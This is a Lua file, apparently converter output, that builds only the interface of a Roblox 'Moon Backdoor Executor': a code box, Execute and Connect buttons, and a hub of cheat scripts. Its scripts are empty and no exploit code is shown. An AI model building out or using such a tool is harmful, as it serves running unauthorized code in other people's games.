--[=[
 Moon Backdoor Executor
]=]

-- Instances: 172 | Scripts: 23 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.ScreenGui
G2L["1"] = Instance.new("ScreenGui", game.CoreGui);
G2L["1"]["IgnoreGuiInset"] = true;
G2L["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;


-- StarterGui.ScreenGui.LocalScript
G2L["2"] = Instance.new("LocalScript", G2L["1"]);



-- StarterGui.ScreenGui.Load
G2L["3"] = Instance.new("Frame", G2L["1"]);
G2L["3"]["BorderSizePixel"] = 0;
G2L["3"]["BackgroundColor3"] = Color3.fromRGB(92, 7, 123);
G2L["3"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["3"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["3"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3"]["Name"] = [[Load]];
G2L["3"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Load.LocalScript
G2L["4"] = Instance.new("LocalScript", G2L["3"]);



-- StarterGui.ScreenGui.Load.bg
G2L["5"] = Instance.new("ImageLabel", G2L["3"]);
G2L["5"]["ZIndex"] = 10000000;
G2L["5"]["BorderSizePixel"] = 0;
G2L["5"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["ImageTransparency"] = 0.4;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["5"]["ImageColor3"] = Color3.fromRGB(129, 0, 255);
G2L["5"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["5"]["Image"] = [[rbxassetid://992001116]];
G2L["5"]["Size"] = UDim2.new(1.41, 0, 1, 0);
G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["BackgroundTransparency"] = 0.4;
G2L["5"]["Name"] = [[bg]];
G2L["5"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.ScreenGui.Load.bg.LocalScript
G2L["6"] = Instance.new("LocalScript", G2L["5"]);



-- StarterGui.ScreenGui.Load.Logo
G2L["7"] = Instance.new("ImageLabel", G2L["3"]);
G2L["7"]["ZIndex"] = 10000000;
G2L["7"]["BorderSizePixel"] = 0;
G2L["7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["ImageTransparency"] = 0.4;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["7"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["7"]["Image"] = [[rbxassetid://73958241564252]];
G2L["7"]["Size"] = UDim2.new(0, 109, 0, 133);
G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["BackgroundTransparency"] = 0.4;
G2L["7"]["Name"] = [[Logo]];
G2L["7"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.ScreenGui.Load.Logo.LocalScript
G2L["8"] = Instance.new("LocalScript", G2L["7"]);



-- StarterGui.ScreenGui.Load.Logo.LocalScript
G2L["9"] = Instance.new("LocalScript", G2L["7"]);



-- StarterGui.ScreenGui.Load.Logo.UIAspectRatioConstraint
G2L["a"] = Instance.new("UIAspectRatioConstraint", G2L["7"]);



-- StarterGui.ScreenGui.Load.Logo.UICorner
G2L["b"] = Instance.new("UICorner", G2L["7"]);
G2L["b"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.ScreenGui.Main
G2L["c"] = Instance.new("Frame", G2L["1"]);
G2L["c"]["Visible"] = false;
G2L["c"]["ZIndex"] = 1000000000;
G2L["c"]["BorderSizePixel"] = 0;
G2L["c"]["BackgroundColor3"] = Color3.fromRGB(92, 7, 123);
G2L["c"]["Size"] = UDim2.new(0, 555, 0, 328);
G2L["c"]["Position"] = UDim2.new(0.23167, 0, 0.2484, 0);
G2L["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c"]["Name"] = [[Main]];


-- StarterGui.ScreenGui.Main.UIDrag
G2L["d"] = Instance.new("LocalScript", G2L["c"]);
G2L["d"]["Name"] = [[UIDrag]];


-- StarterGui.ScreenGui.Main.LocalScript
G2L["e"] = Instance.new("LocalScript", G2L["c"]);



-- StarterGui.ScreenGui.Main.LocalScript
G2L["f"] = Instance.new("LocalScript", G2L["c"]);



-- StarterGui.ScreenGui.Main.bg
G2L["10"] = Instance.new("ImageLabel", G2L["c"]);
G2L["10"]["ZIndex"] = 1000000000;
G2L["10"]["BorderSizePixel"] = 0;
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10"]["ImageTransparency"] = 0.4;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["10"]["ImageColor3"] = Color3.fromRGB(129, 0, 255);
G2L["10"]["Image"] = [[rbxassetid://992001116]];
G2L["10"]["Size"] = UDim2.new(0, 555, 0, 328);
G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["BackgroundTransparency"] = 1;
G2L["10"]["Name"] = [[bg]];
G2L["10"]["Position"] = UDim2.new(0, 0, 0, 0);


-- StarterGui.ScreenGui.Main.bg.UICorner
G2L["11"] = Instance.new("UICorner", G2L["10"]);
G2L["11"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Main.CodeBar
G2L["12"] = Instance.new("TextBox", G2L["c"]);
G2L["12"]["Name"] = [[CodeBar]];
G2L["12"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["12"]["ZIndex"] = 1000000000;
G2L["12"]["BorderSizePixel"] = 0;
G2L["12"]["TextWrapped"] = true;
G2L["12"]["TextSize"] = 17;
G2L["12"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["12"]["BackgroundColor3"] = Color3.fromRGB(3, 3, 3);
G2L["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["12"]["MultiLine"] = true;
G2L["12"]["ClearTextOnFocus"] = false;
G2L["12"]["PlaceholderText"] = [[print(" Moon Backdoor")]];
G2L["12"]["Size"] = UDim2.new(0, 506, 0, 212);
G2L["12"]["Position"] = UDim2.new(0.04237, 0, 0.14512, 0);
G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12"]["Text"] = [[]];


-- StarterGui.ScreenGui.Main.CodeBar.UICorner
G2L["13"] = Instance.new("UICorner", G2L["12"]);
G2L["13"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Main.Buttons
G2L["14"] = Instance.new("Frame", G2L["c"]);
G2L["14"]["ZIndex"] = 1000000000;
G2L["14"]["BorderSizePixel"] = 0;
G2L["14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14"]["Size"] = UDim2.new(0, 506, 0, 43);
G2L["14"]["Position"] = UDim2.new(0.04237, 0, 0.82555, 0);
G2L["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14"]["Name"] = [[Buttons]];
G2L["14"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Main.Buttons.UIListLayout
G2L["15"] = Instance.new("UIListLayout", G2L["14"]);
G2L["15"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["15"]["Padding"] = UDim.new(0, 19);
G2L["15"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["15"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["15"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.ScreenGui.Main.Buttons.Exe
G2L["16"] = Instance.new("TextButton", G2L["14"]);
G2L["16"]["BorderSizePixel"] = 0;
G2L["16"]["TextSize"] = 29;
G2L["16"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16"]["BackgroundColor3"] = Color3.fromRGB(69, 3, 113);
G2L["16"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["16"]["ZIndex"] = 1000000000;
G2L["16"]["Size"] = UDim2.new(0, 243, 0, 38);
G2L["16"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16"]["Text"] = [[Execute]];
G2L["16"]["Name"] = [[Exe]];
G2L["16"]["Position"] = UDim2.new(0.07609, 0, 0.05814, 0);


-- StarterGui.ScreenGui.Main.Buttons.Exe.UICorner
G2L["17"] = Instance.new("UICorner", G2L["16"]);
G2L["17"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Main.Buttons.Clear
G2L["18"] = Instance.new("TextButton", G2L["14"]);
G2L["18"]["BorderSizePixel"] = 0;
G2L["18"]["TextSize"] = 29;
G2L["18"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18"]["BackgroundColor3"] = Color3.fromRGB(69, 3, 113);
G2L["18"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["18"]["ZIndex"] = 1000000000;
G2L["18"]["Size"] = UDim2.new(0, 243, 0, 38);
G2L["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18"]["Text"] = [[clear]];
G2L["18"]["Name"] = [[Clear]];
G2L["18"]["Position"] = UDim2.new(0.60236, 0, 0.05814, 0);


-- StarterGui.ScreenGui.Main.Buttons.Clear.UICorner
G2L["19"] = Instance.new("UICorner", G2L["18"]);
G2L["19"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Main.Name
G2L["1a"] = Instance.new("TextLabel", G2L["c"]);
G2L["1a"]["ZIndex"] = 1000000000;
G2L["1a"]["BorderSizePixel"] = 0;
G2L["1a"]["TextSize"] = 36;
G2L["1a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["1a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a"]["BackgroundTransparency"] = 1;
G2L["1a"]["Size"] = UDim2.new(0, 235, 0, 52);
G2L["1a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a"]["Text"] = [[Moon Backdoor]];
G2L["1a"]["Name"] = [[Name]];
G2L["1a"]["Position"] = UDim2.new(0.13347, 0, 0, 0);


-- StarterGui.ScreenGui.Main.Logo
G2L["1b"] = Instance.new("ImageLabel", G2L["c"]);
G2L["1b"]["ZIndex"] = 1000000000;
G2L["1b"]["BorderSizePixel"] = 0;
G2L["1b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["1b"]["Image"] = [[rbxassetid://73958241564252]];
G2L["1b"]["Size"] = UDim2.new(0, 38, 0, 34);
G2L["1b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b"]["BackgroundTransparency"] = 1;
G2L["1b"]["Name"] = [[Logo]];
G2L["1b"]["Position"] = UDim2.new(0.04237, 0, 0.0258, 0);


-- StarterGui.ScreenGui.Main.Logo.UIAspectRatioConstraint
G2L["1c"] = Instance.new("UIAspectRatioConstraint", G2L["1b"]);



-- StarterGui.ScreenGui.Main.Stats
G2L["1d"] = Instance.new("TextLabel", G2L["c"]);
G2L["1d"]["ZIndex"] = 1000000000;
G2L["1d"]["BorderSizePixel"] = 0;
G2L["1d"]["TextSize"] = 20;
G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d"]["BackgroundTransparency"] = 1;
G2L["1d"]["Size"] = UDim2.new(0, 58, 0, 52);
G2L["1d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d"]["Text"] = [[🔴]];
G2L["1d"]["Name"] = [[Stats]];
G2L["1d"]["Position"] = UDim2.new(0.89407, 0, 0, 0);


-- StarterGui.ScreenGui.Main.Stats.UIAspectRatioConstraint
G2L["1e"] = Instance.new("UIAspectRatioConstraint", G2L["1d"]);



-- StarterGui.ScreenGui.Main.Connect
G2L["1f"] = Instance.new("TextButton", G2L["c"]);
G2L["1f"]["BorderSizePixel"] = 0;
G2L["1f"]["TextSize"] = 20;
G2L["1f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f"]["BackgroundColor3"] = Color3.fromRGB(69, 3, 113);
G2L["1f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1f"]["ZIndex"] = 1000000000;
G2L["1f"]["Size"] = UDim2.new(0.03105, 98, 0.01352, 22);
G2L["1f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f"]["Text"] = [[Connect]];
G2L["1f"]["Name"] = [[Connect]];
G2L["1f"]["Position"] = UDim2.new(0.69522, 0, 0.03894, 0);


-- StarterGui.ScreenGui.Main.Connect.UICorner
G2L["20"] = Instance.new("UICorner", G2L["1f"]);
G2L["20"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Main.UICorner
G2L["21"] = Instance.new("UICorner", G2L["c"]);
G2L["21"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Main.Hub
G2L["22"] = Instance.new("TextButton", G2L["c"]);
G2L["22"]["BorderSizePixel"] = 0;
G2L["22"]["TextSize"] = 20;
G2L["22"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["22"]["BackgroundColor3"] = Color3.fromRGB(69, 3, 113);
G2L["22"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["22"]["ZIndex"] = 1000000000;
G2L["22"]["Size"] = UDim2.new(-0.01895, 98, 0.01352, 22);
G2L["22"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["22"]["Text"] = [[Hub]];
G2L["22"]["Name"] = [[Hub]];
G2L["22"]["Position"] = UDim2.new(0.51522, 0, 0.03894, 0);


-- StarterGui.ScreenGui.Main.Hub.LocalScript
G2L["23"] = Instance.new("LocalScript", G2L["22"]);



-- StarterGui.ScreenGui.Main.Hub.UICorner
G2L["24"] = Instance.new("UICorner", G2L["22"]);
G2L["24"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub
G2L["25"] = Instance.new("Frame", G2L["1"]);
G2L["25"]["Visible"] = false;
G2L["25"]["ZIndex"] = 1000000000;
G2L["25"]["BorderSizePixel"] = 0;
G2L["25"]["BackgroundColor3"] = Color3.fromRGB(92, 7, 123);
G2L["25"]["Size"] = UDim2.new(0, 555, 0, 328);
G2L["25"]["Position"] = UDim2.new(0.23167, 0, 0.2484, 0);
G2L["25"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25"]["Name"] = [[Hub]];


-- StarterGui.ScreenGui.Hub.UIDrag
G2L["26"] = Instance.new("LocalScript", G2L["25"]);
G2L["26"]["Name"] = [[UIDrag]];


-- StarterGui.ScreenGui.Hub.bg
G2L["27"] = Instance.new("ImageLabel", G2L["25"]);
G2L["27"]["ZIndex"] = 1000000000;
G2L["27"]["BorderSizePixel"] = 0;
G2L["27"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["27"]["ImageTransparency"] = 0.4;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["27"]["ImageColor3"] = Color3.fromRGB(129, 0, 255);
G2L["27"]["Image"] = [[rbxassetid://992001116]];
G2L["27"]["Size"] = UDim2.new(0, 555, 0, 328);
G2L["27"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["27"]["BackgroundTransparency"] = 1;
G2L["27"]["Name"] = [[bg]];
G2L["27"]["Position"] = UDim2.new(0, 0, 0, 0);


-- StarterGui.ScreenGui.Hub.bg.UICorner
G2L["28"] = Instance.new("UICorner", G2L["27"]);
G2L["28"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.Name
G2L["29"] = Instance.new("TextLabel", G2L["25"]);
G2L["29"]["ZIndex"] = 1000000000;
G2L["29"]["BorderSizePixel"] = 0;
G2L["29"]["TextSize"] = 36;
G2L["29"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["29"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["29"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["29"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["29"]["BackgroundTransparency"] = 1;
G2L["29"]["Size"] = UDim2.new(0, 235, 0, 52);
G2L["29"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["29"]["Text"] = [[Moon Backdoor Hub!]];
G2L["29"]["Name"] = [[Name]];
G2L["29"]["Position"] = UDim2.new(0.13347, 0, 0, 0);


-- StarterGui.ScreenGui.Hub.Logo
G2L["2a"] = Instance.new("ImageLabel", G2L["25"]);
G2L["2a"]["ZIndex"] = 1000000000;
G2L["2a"]["BorderSizePixel"] = 0;
G2L["2a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["2a"]["Image"] = [[rbxassetid://73958241564252]];
G2L["2a"]["Size"] = UDim2.new(0, 38, 0, 34);
G2L["2a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a"]["BackgroundTransparency"] = 1;
G2L["2a"]["Name"] = [[Logo]];
G2L["2a"]["Position"] = UDim2.new(0.04237, 0, 0.0258, 0);


-- StarterGui.ScreenGui.Hub.Logo.UIAspectRatioConstraint
G2L["2b"] = Instance.new("UIAspectRatioConstraint", G2L["2a"]);



-- StarterGui.ScreenGui.Hub.Hub
G2L["2c"] = Instance.new("TextButton", G2L["25"]);
G2L["2c"]["BorderSizePixel"] = 0;
G2L["2c"]["TextSize"] = 20;
G2L["2c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2c"]["BackgroundColor3"] = Color3.fromRGB(69, 3, 113);
G2L["2c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2c"]["ZIndex"] = 1000000000;
G2L["2c"]["Size"] = UDim2.new(-0.01895, 98, 0.01352, 22);
G2L["2c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2c"]["Text"] = [[Exe]];
G2L["2c"]["Name"] = [[Hub]];
G2L["2c"]["Position"] = UDim2.new(0.79522, 0, 0.03894, 0);


-- StarterGui.ScreenGui.Hub.Hub.LocalScript
G2L["2d"] = Instance.new("LocalScript", G2L["2c"]);



-- StarterGui.ScreenGui.Hub.Hub.UICorner
G2L["2e"] = Instance.new("UICorner", G2L["2c"]);
G2L["2e"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame
G2L["2f"] = Instance.new("ScrollingFrame", G2L["25"]);
G2L["2f"]["Active"] = true;
G2L["2f"]["ZIndex"] = 1000000000;
G2L["2f"]["BorderSizePixel"] = 0;
G2L["2f"]["CanvasSize"] = UDim2.new(0, 0, 5, 0);
G2L["2f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2f"]["Size"] = UDim2.new(-0.01, 505, 0, 259);
G2L["2f"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2f"]["Position"] = UDim2.new(0.05144, 0, 0.15854, 0);
G2L["2f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2f"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.UIPadding
G2L["30"] = Instance.new("UIPadding", G2L["2f"]);
G2L["30"]["PaddingTop"] = UDim.new(0, 5);
G2L["30"]["PaddingLeft"] = UDim.new(0, 8);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.UIListLayout
G2L["31"] = Instance.new("UIListLayout", G2L["2f"]);
G2L["31"]["Wraps"] = true;
G2L["31"]["Padding"] = UDim.new(0, 6);
G2L["31"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["31"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["32"] = Instance.new("Frame", G2L["2f"]);
G2L["32"]["BorderSizePixel"] = 0;
G2L["32"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["32"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["32"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["32"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["33"] = Instance.new("UIStroke", G2L["32"]);
G2L["33"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["33"]["Thickness"] = 1.3;
G2L["33"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["34"] = Instance.new("ImageLabel", G2L["32"]);
G2L["34"]["BorderSizePixel"] = 0;
G2L["34"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["34"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["34"]["Image"] = [[rbxassetid://114500437382056]];
G2L["34"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["34"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["34"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["35"] = Instance.new("UICorner", G2L["34"]);
G2L["35"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["36"] = Instance.new("UIGradient", G2L["34"]);
G2L["36"]["Rotation"] = 90;
G2L["36"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["37"] = Instance.new("TextButton", G2L["32"]);
G2L["37"]["BorderSizePixel"] = 0;
G2L["37"]["TextSize"] = 22;
G2L["37"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["37"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["37"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["37"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["37"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["37"]["Text"] = [[Execute]];
G2L["37"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["38"] = Instance.new("LocalScript", G2L["37"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["39"] = Instance.new("UICorner", G2L["37"]);
G2L["39"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["3a"] = Instance.new("UICorner", G2L["32"]);
G2L["3a"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["3b"] = Instance.new("TextLabel", G2L["32"]);
G2L["3b"]["BorderSizePixel"] = 0;
G2L["3b"]["TextSize"] = 32;
G2L["3b"]["TextTransparency"] = 0.49;
G2L["3b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3b"]["BackgroundTransparency"] = 1;
G2L["3b"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["3b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3b"]["Text"] = [[Goner]];
G2L["3b"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["3c"] = Instance.new("Frame", G2L["2f"]);
G2L["3c"]["BorderSizePixel"] = 0;
G2L["3c"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["3c"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["3c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3c"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["3d"] = Instance.new("UIStroke", G2L["3c"]);
G2L["3d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["3d"]["Thickness"] = 1.3;
G2L["3d"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["3e"] = Instance.new("ImageLabel", G2L["3c"]);
G2L["3e"]["BorderSizePixel"] = 0;
G2L["3e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3e"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["3e"]["Image"] = [[rbxassetid://72792773278885]];
G2L["3e"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["3e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3e"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["3f"] = Instance.new("UICorner", G2L["3e"]);
G2L["3f"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["40"] = Instance.new("UIGradient", G2L["3e"]);
G2L["40"]["Rotation"] = 90;
G2L["40"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["41"] = Instance.new("TextButton", G2L["3c"]);
G2L["41"]["BorderSizePixel"] = 0;
G2L["41"]["TextSize"] = 22;
G2L["41"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["41"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["41"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["41"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["41"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["41"]["Text"] = [[Execute]];
G2L["41"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["42"] = Instance.new("LocalScript", G2L["41"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["43"] = Instance.new("UICorner", G2L["41"]);
G2L["43"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["44"] = Instance.new("UICorner", G2L["3c"]);
G2L["44"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["45"] = Instance.new("TextLabel", G2L["3c"]);
G2L["45"]["BorderSizePixel"] = 0;
G2L["45"]["TextSize"] = 32;
G2L["45"]["TextTransparency"] = 0.49;
G2L["45"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["45"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["45"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["45"]["BackgroundTransparency"] = 1;
G2L["45"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["45"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["45"]["Text"] = [[infinte yield]];
G2L["45"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["46"] = Instance.new("Frame", G2L["2f"]);
G2L["46"]["BorderSizePixel"] = 0;
G2L["46"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["46"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["46"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["46"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["47"] = Instance.new("UIStroke", G2L["46"]);
